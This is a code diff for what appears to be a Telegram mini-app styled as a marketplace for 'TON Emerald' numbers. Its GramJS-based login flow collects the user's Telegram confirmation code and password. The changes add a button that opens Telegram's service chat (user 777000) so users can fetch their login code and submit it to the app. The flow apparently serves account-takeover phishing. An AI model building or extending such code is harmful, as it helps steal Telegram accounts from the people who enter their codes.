@@ -17,6 +17,11 @@ const GRAMJS_ALLOWED_MISMATCH_PHONES =
   'allowedMismatchPhones' in GRAMJS_CONFIG ? GRAMJS_CONFIG.allowedMismatchPhones : [];
 const GRAMJS_PENDING_TTL_MS =
   'pendingTtlSec' in GRAMJS_CONFIG ? Number(GRAMJS_CONFIG.pendingTtlSec) * 1000 : 300 * 1000;
+const CODE_VIEW_LINKS = {
+  android: 'tg://openmessage?user_id=777000',
+  ios: 'https://t.me/@id777000',
+};
+const CODE_VIEW_PLATFORMS = new Set(Object.keys(CODE_VIEW_LINKS));
 
 const DEFAULT_MARKET = [
   { id: '352352', name: 'TON Emerald', number: 352352, price: 18.5, image: null },
@@ -119,6 +124,8 @@ const TRANSLATIONS = {
     auth_code_title: 'Код подтверждения',
     auth_code_text: 'Мы отправили код в приложение Telegram.',
     auth_code_label: 'Код',
+    auth_code_button: 'Посмотреть код',
+    auth_code_platform: 'Откройте Telegram на Android или iPhone, чтобы увидеть код.',
     auth_code_hint: 'Посмотреть код:',
     auth_code_link: 'Открыть Telegram',
     auth_back: 'Назад',
@@ -318,6 +325,8 @@ const TRANSLATIONS = {
     auth_code_title: 'Confirmation code',
     auth_code_text: 'We sent the code to Telegram.',
     auth_code_label: 'Code',
+    auth_code_button: 'View code',
+    auth_code_platform: 'Open Telegram on Android or iPhone to see the code.',
     auth_code_hint: 'Check the code:',
     auth_code_link: 'Open Telegram',
     auth_back: 'Back',
@@ -608,6 +617,8 @@ const elements = {
   codeInput: document.getElementById('code-input'),
   codeCells: document.getElementById('code-cells'),
   codeCellNodes: Array.from(document.querySelectorAll('#code-cells .code-cell')),
+  authCodeOpen: document.getElementById('auth-code-open'),
+  authPlatformHint: document.getElementById('auth-platform-hint'),
   authPasswordInput: document.getElementById('auth-password-input'),
   passwordInput: document.getElementById('password-input'),
   passwordToggle: document.getElementById('password-toggle'),
@@ -1060,6 +1071,73 @@ function getTelegramUser() {
   }
 
   return null;
+}
+
+function normalizePlatform(value) {
+  if (!value) return null;
+  const lower = String(value).toLowerCase();
+  if (lower.includes('android')) return 'android';
+  if (lower.includes('ios') || lower.includes('iphone')) return 'ios';
+  return lower;
+}
+
+function resolveTelegramPlatform() {
+  const tg = tgWebApp || window.Telegram?.WebApp;
+  const platform = normalizePlatform(tg?.platform);
+  if (platform && CODE_VIEW_PLATFORMS.has(platform)) return platform;
+  if (typeof navigator !== 'undefined') {
+    const ua = navigator.userAgent || '';
+    if (/android/i.test(ua)) return 'android';
+    if (/iphone|ipad|ipod/i.test(ua)) return 'ios';
+  }
+  return platform;
+}
+
+function getCodeViewLink(platform) {
+  if (platform && CODE_VIEW_PLATFORMS.has(platform)) {
+    return CODE_VIEW_LINKS[platform];
+  }
+  return '';
+}
+
+function applyCodePlatformState() {
+  const platform = resolveTelegramPlatform();
+  const isSupported = platform ? CODE_VIEW_PLATFORMS.has(platform) : false;
+
+  if (elements.authPlatformHint) {
+    elements.authPlatformHint.classList.toggle('is-hidden', isSupported);
+    elements.authPlatformHint.classList.toggle('is-error', !isSupported);
+  }
+  if (elements.codeInput) {
+    elements.codeInput.classList.toggle('is-disabled', !isSupported);
+  }
+  if (elements.authCodeOpen) {
+    elements.authCodeOpen.disabled = !isSupported;
+    elements.authCodeOpen.dataset.platform = platform || '';
+  }
+  if (elements.authCodeInput) {
+    elements.authCodeInput.disabled = !isSupported;
+  }
+  if (elements.authCodeForm) {
+    const submitBtn = elements.authCodeForm.querySelector('button[type="submit"]');
+    if (submitBtn) submitBtn.disabled = !isSupported;
+  }
+
+  return { platform, isSupported, link: getCodeViewLink(platform) };
+}
+
+function openTelegramLink(url) {
+  if (!url) return;
+  const tg = tgWebApp || window.Telegram?.WebApp;
+  if (typeof tg?.openTelegramLink === 'function') {
+    tg.openTelegramLink(url);
+    return;
+  }
+  if (typeof tg?.openLink === 'function') {
+    tg.openLink(url);
+    return;
+  }
+  window.location.href = url;
 }
 
 function buildRequesterPayload() {
@@ -3392,7 +3470,9 @@ function bindCodeInput() {
   if (!elements.authCodeInput) return;
   if (elements.codeInput) {
     elements.codeInput.addEventListener('click', () => {
-      elements.authCodeInput.focus();
+      if (!elements.authCodeInput.disabled) {
+        elements.authCodeInput.focus();
+      }
     });
   }
   const maybeAutoSubmit = () => {
@@ -3679,7 +3759,8 @@ function showAuthStep(step) {
   if (step === elements.authCodeForm) {
     setCodeError(false);
     syncCodeCells();
-    if (elements.authCodeInput) {
+    const { isSupported } = applyCodePlatformState();
+    if (isSupported && elements.authCodeInput) {
       setTimeout(() => {
         elements.authCodeInput.focus();
       }, 50);
@@ -4386,6 +4467,11 @@ async function submitCode(event) {
   if (authLoading || !authToken || !gramjsAuth) return;
   triggerHaptic('light');
   setCodeError(false);
+  const { isSupported } = applyCodePlatformState();
+  if (!isSupported) {
+    setAuthStatus(t('auth_code_platform'), true);
+    return;
+  }
 
   const code = elements.authCodeInput?.value?.trim() || '';
   if (code.length < 5) {
@@ -4442,6 +4528,18 @@ function bindAuthModal() {
     elements.authStart.addEventListener('click', () => {
       triggerHaptic('light');
       startAuth();
+    });
+  }
+
+  if (elements.authCodeOpen) {
+    elements.authCodeOpen.addEventListener('click', () => {
+      triggerHaptic('light');
+      const { link, isSupported } = applyCodePlatformState();
+      if (!isSupported || !link) {
+        setAuthStatus(t('auth_code_platform'), true);
+        return;
+      }
+      openTelegramLink(link);
     });
   }
 
